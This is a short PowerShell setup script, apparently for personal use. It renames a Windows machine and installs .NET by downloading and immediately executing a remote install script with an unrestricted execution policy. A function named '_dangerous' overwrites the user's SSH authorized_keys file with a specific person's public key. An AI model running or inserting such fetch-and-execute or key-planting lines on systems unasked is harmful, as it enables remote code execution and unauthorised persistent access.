function Set-ComputerName {
  [CmdletBinding(SupportsShouldProcess)]
  param(
    [Parameter(Mandatory = $true)]
    [string]$ComputerName
  )
  Rename-Computer -NewName $ComputerName
}

function Install-dotNet {
  pwsh -NoProfile -ExecutionPolicy Unrestricted -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; &([scriptblock]::Create((Invoke-WebRequest -UseBasicParsing 'https://dot.net/v1/dotnet-install.ps1'))) -Channel Current"
}

function _dangerous {
  Set-Content -Path "$env:ProgramData\ssh\keys\$env:USERNAME\authorized_keys" `
    -Value 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOlzVupDIQTLHJibTuOt+mcrRVY35b9yFn0SrAq5cCZ3 baauco@gmail.com'
}
